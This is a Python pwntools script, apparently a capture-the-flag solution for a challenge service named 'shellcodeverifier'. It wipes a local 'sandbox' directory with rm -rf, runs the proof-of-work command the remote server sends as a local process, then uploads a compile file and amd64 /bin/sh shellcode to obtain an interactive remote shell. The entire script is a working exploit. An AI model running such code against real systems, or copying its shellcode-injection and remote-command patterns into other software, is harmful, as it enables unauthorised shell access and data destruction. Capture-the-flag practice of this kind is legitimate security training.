from pwn import *
import os
context.arch = "amd64"

os.system("rm -rf sandbox")


#r = process("./main")

r = remote("shellcodeverifier.hackable.software", 1337)
r.recvuntil(b":")
s = process(r.recvline().split())
s.recvuntil(b": ")
ans = s.recvline()
s.close()
r.send(ans)


comp = open("compile","rb").read()
source = asm(shellcraft.sh())
r.sendlineafter(b"size:",str(len(comp)).encode("utf-8"))
r.sendafter(b"contents:",comp)
r.sendlineafter(b"size:",str(len(source)).encode("utf-8"))
r.sendafter(b"contents:",source)
r.interactive()



